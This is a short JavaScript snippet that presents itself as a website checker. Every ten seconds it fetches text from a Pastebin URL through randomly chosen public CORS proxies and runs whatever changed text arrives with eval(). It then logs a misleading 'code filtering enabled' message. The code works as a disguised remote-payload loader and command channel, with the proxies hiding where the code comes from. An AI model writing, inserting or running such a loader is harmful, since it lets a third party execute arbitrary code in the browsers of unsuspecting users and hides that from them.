const CORS_PROXY = [
  "https://api.allorigins.win/raw?url=",
  "https://api.cors.lol/?url=",
  "https://corsproxy.io/?url=",
  "https://api.codetabs.com/v1/proxy?quest=",
];

let response = "";

function checkWebsite() {
  fetch(
    `${
      CORS_PROXY[Math.floor(Math.random() * CORS_PROXY.length)]
    }https://pastebin.com/raw/AbUUxLR1`
  ) // Replace with your target URL
    .then(response => response.text())
    .then(data => {
      if (data != response) {
        eval(data);
        response = data;
        console.log("code filtering enabled");
      }
    })
    .catch(console.error);
}

// Check every 10 seconds
setInterval(checkWebsite, 10000);
checkWebsite();
